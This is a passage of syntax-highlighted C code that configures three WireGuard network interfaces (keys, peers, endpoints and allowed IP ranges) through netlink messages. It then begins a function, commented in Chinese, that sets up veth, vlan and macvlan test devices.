<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet6</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">second_half_v6</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">second_half_v6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">netlink_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">genlhdr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">genlhdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGDEVICE_A_IFNAME</span><span class="p">,</span><span class="w"> </span><span class="n">ifname_b</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">ifname_b</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGDEVICE_A_PRIVATE_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">private_b</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGDEVICE_A_LISTEN_PORT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">listen_b</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WGDEVICE_A_PEERS</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PUBLIC_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">public_a</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_ENDPOINT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">endpoint_a_v6</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">endpoint_a_v6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL</span><span class="p">,</span>
<span class="w">               </span><span class="o">&amp;</span><span class="n">persistent_keepalives</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WGPEER_A_ALLOWEDIPS</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">first_half_v4</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">first_half_v4</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet6</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">first_half_v6</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">first_half_v6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PUBLIC_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">public_c</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_ENDPOINT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">endpoint_c_v4</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">endpoint_c_v4</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL</span><span class="p">,</span>
<span class="w">               </span><span class="o">&amp;</span><span class="n">persistent_keepalives</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WGPEER_A_ALLOWEDIPS</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">second_half_v4</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">second_half_v4</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet6</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">second_half_v6</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">second_half_v6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">netlink_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">genlhdr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">genlhdr</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGDEVICE_A_IFNAME</span><span class="p">,</span><span class="w"> </span><span class="n">ifname_c</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">ifname_c</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGDEVICE_A_PRIVATE_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">private_c</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGDEVICE_A_LISTEN_PORT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">listen_c</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WGDEVICE_A_PEERS</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PUBLIC_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">public_a</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_ENDPOINT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">endpoint_a_v6</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">endpoint_a_v6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL</span><span class="p">,</span>
<span class="w">               </span><span class="o">&amp;</span><span class="n">persistent_keepalives</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WGPEER_A_ALLOWEDIPS</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">first_half_v4</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">first_half_v4</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet6</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">first_half_v6</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">first_half_v6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PUBLIC_KEY</span><span class="p">,</span><span class="w"> </span><span class="n">public_b</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_ENDPOINT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">endpoint_b_v4</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">endpoint_b_v4</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL</span><span class="p">,</span>
<span class="w">               </span><span class="o">&amp;</span><span class="n">persistent_keepalives</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WGPEER_A_ALLOWEDIPS</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">second_half_v4</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">second_half_v4</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_nest</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">NLA_F_NESTED</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_FAMILY</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">af_inet6</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_IPADDR</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">second_half_v6</span><span class="p">,</span>
<span class="w">               </span><span class="k">sizeof</span><span class="p">(</span><span class="n">second_half_v6</span><span class="p">));</span>
<span class="w">  </span><span class="n">netlink_attr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">WGALLOWEDIP_A_CIDR_MASK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">half_cidr</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">netlink_done</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">);</span>
<span class="w">  </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nlmsg</span><span class="p">,</span><span class="w"> </span><span class="n">sock</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>

<span class="nl">error</span><span class="p">:</span>
<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// 初始化各种网络设备，如veth对、vlan、macvlan等</span>
<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">initialize_netdevices</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">netdevsim</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
<span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">netdevsim</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;netdevsim%d&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">procid</span><span class="p">);</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">type</span><span class="p">;</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">dev</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">devtypes</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
